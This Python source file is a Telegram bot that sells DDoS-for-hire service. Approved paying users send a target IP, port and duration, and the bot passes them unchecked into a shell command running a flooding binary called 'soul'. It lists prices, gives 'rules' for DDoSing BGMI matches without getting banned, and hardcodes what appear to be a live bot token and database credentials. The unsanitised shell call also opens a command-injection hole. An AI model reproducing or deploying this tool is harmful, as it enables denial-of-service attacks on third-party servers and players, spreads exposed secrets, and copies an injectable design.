import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread

loop = asyncio.get_event_loop()

TOKEN = '7454484515:AAHg3tCif3BUDrQvakzce77xr1nZD_eZqgY'
MONGO_URI = 'mongodb+srv://MEGOXER:MEGOXER@MEGOXER.2mx1d.mongodb.net/?retryWrites=true&w=majority&appName=MEGOXER'
FORWARD_CHANNEL_ID = -1002192953421
CHANNEL_ID = -1002192953421
error_channel_id = -1002192953421

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['zoya']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

running_processes = []


REMOTE_HOST = '4.213.71.147'  
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./soul {target_ip} {target_port} {duration} 70"
    try:
       
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        running_processes.append(process)
        stdout, stderr = await process.communicate()
        output = stdout.decode()
        error = stderr.decode()

        if output:
            logging.info(f"Command output: {output}")
        if error:
            logging.error(f"Command error: {error}")

    except Exception as e:
        logging.error(f"Failed to execute command on Codespace: {e}")
    finally:
        if process in running_processes:
            running_processes.remove(process)

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    await run_attack_command_on_codespace(target_ip, target_port, duration)

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

def check_user_approval(user_id):
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data and user_data['plan'] > 0:
        return True
    return False

def send_not_approved_message(chat_id):
    bot.send_message(chat_id, '''*🚫 Access Denied!
🚫 YOU ARE NOT APPROVED 🚫
You need to be approved to use this bot.
Contact the owner for assistance: @smokiemods.*''', parse_mode='Markdown')

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, '''*🚫 Access Denied!
You don't have permission to use this command.*''', parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        if plan == 1:  # Instant Plan 🧡
            if users_collection.count_documents({"plan": 1}) >= 99:
                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
                return
        elif plan == 2:  # Attack 🚀
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "*Approval failed: Attack 🚀 limit reached (499 users).*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*✅ User {target_user_id} approved for {days} days.*"
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*🔴 User {target_user_id} disapproved*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    try:
        bot.send_message(chat_id, '''*💣Ready to launch an attack?\n
Please provide the target IP, port, and duration in seconds.\n
Example: 167.67.25 6296 60 🔥\n
Let the chaos begin! 🎉*\n
FEEDBACK COMPULSORY ✅\n\nSEND FEEDBACK WHEN YOU RUN ANY ATTACK 💟\n\nREGARDS - @smokiemods ✅.''', parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid command format. \nYOU PROVIDE THIS MSG=>💣Ready to launch an attack?\nTHEN ONLY ENTER IP PORT TIME \n DO NOT ENTER ANYTHING ELSE OTHERWISE IT'S OCURE ERROR...*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        username = message.from_user.username
        bot.send_message(message.chat.id, f"*🚀 Attack Sent Successfully! 🚀\n🚀 Attack Launched! 🚀\n\n📡 Target Host:: {target_ip}\n👉 Target Port:{target_port}\n⏰ Duration: {duration} Seconds\n\nFEEDBACK COMPULSORY ✅\n\nSEND FEEDBACK WHEN YOU RUN ANY ATTACK 💟\n\nREGARDS - @smokiemods ✅*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Create a markup object
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)

    # Create buttons
    btn1 = KeyboardButton("Attack 🚀")
    btn2 = KeyboardButton("My Info ℹ️")
    btn3 = KeyboardButton("Buy Access! 💰")
    btn4 = KeyboardButton("Rules 🔰")
    btn5 = KeyboardButton("👤 Owner")
    btn6 = KeyboardButton("HELP")
    btn7 = KeyboardButton("canary")
    # Add buttons to the markup
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)

    bot.send_message(message.chat.id, '''*WELCOME TO DDOS WORLD! 🎉

🚀 Get ready to dive into the action!

💣 To unleash your power, use the `Attack 🚀` command followed by your target's IP and port. ⚔️

🔍 Example:  `Attack 🚀`, enter: ip port duration.

🔥 Ensure your target is locked in before you strike!

📚 New around here? Check out the `HELP` command to discover all my capabilities. 📜

⚠️ Remember, with great power comes great responsibility! Use it wisely... or let the chaos reign! 😈💥

 DEAR {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. 🤖ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss.

✅DM :- @smokiemods*''', reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if not check_user_approval(message.from_user.id):
        send_not_approved_message(message.chat.id)
        return

    if message.text == "MEGOXER":
        bot.reply_to(message, "*MEGOXER*", parse_mode='Markdown')
    elif message.text == "Attack 🚀":
        attack_command(message)
    elif message.text == "My Info ℹ️":
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data:
            username = message.from_user.username
            user_id = message.from_user.id
            plan = user_data.get('plan', 'N/A')
            valid_until = user_data.get('valid_until', 'N/A')
            current_time = datetime.now().isoformat()
            response = (f"*USERNAME: @{username}\n"
                        f"USER ID: {user_id}\n"
                        f"PLAN: {plan} DAYS\n"
                        f"VALID UNTIL: {valid_until}*")
        else:
            response = "*No account information found. Please contact the administrator.*"
        bot.reply_to(message, response, parse_mode='Markdown')
    elif message.text == "Buy Access! 💰":
        bot.reply_to(message, "*𝗕𝗚𝗠𝗜 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦 𝗣𝗥𝗜𝗖𝗘\n\n[𝗣𝗿𝗲𝗺𝗶𝘂𝗺]\n> DAY - 150 INR\n> WEEK - 700 INR\n\n[𝗣𝗹𝗮𝘁𝗶𝗻𝘂𝗺]\n> MONTH - 1600 INR\n\nDM TO BUY @smokiemods*", parse_mode='Markdown')
    elif message.text == "👤 Owner":
        bot.reply_to(message, '''👤 Owner Information:

For any inquiries, support, or collaboration opportunities, don't hesitate to reach out to the owner:

📩 Telegram: @smokiemods

💬 We value your feedback! Your thoughts and suggestions are crucial for improving our service and enhancing your experience.

🌟 Thank you for being a part of our community! Your support means the world to us, and we’re always here to help!''', parse_mode='Markdown')
    elif message.text == "HELP":
        bot.reply_to(message, ''' 🌟 Welcome to the Ultimate Command Center!
Here’s what you can do: 
1. `Attack 🚀` - ⚔️ Launch a powerful attack and show your skills!
2. `My Info ℹ️` - 👤 Check your account info and stay updated.
3. `👤 Owner` - 📞 Get in touch with the mastermind behind this bot!
4. `Buy Access! 💰` - ⏳ Curious about the bot's status? Find out now!
5. `canary` - 🦅 Grab the latest Canary version for cutting-edge features.
6. `Rules 🔰` - 📜 Review the rules to keep the game fair and fun.

💡 Got questions? Don't hesitate to ask! Your satisfaction is our priority!


''', parse_mode='Markdown')
    elif message.text == "canary":
        bot.reply_to(message, "*USE THE LINK FOR CANARY DOWNLOAD:\n\nhttps://t.me/c/1514987284/208*", parse_mode='Markdown')
    elif message.text == "Rules 🔰":
        bot.reply_to(message, "*🔆 𝐑𝐔𝐋𝐄𝐒 🔆\n\n1. Do ddos in 3 match after play 2 match normal or play 2 tdm match\n2. Do less then 25 kills to avoid ban\n3. Dont Run Too Many Attacks !! Cause A Ban From Bot\n4. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot\n5. After 1 or 2 match clear cache of your game \n\n🟢 FOLLOW THIS RULES TO AVOID 1 MONTH BAN 🟢*", parse_mode='Markdown')
    else:
        bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
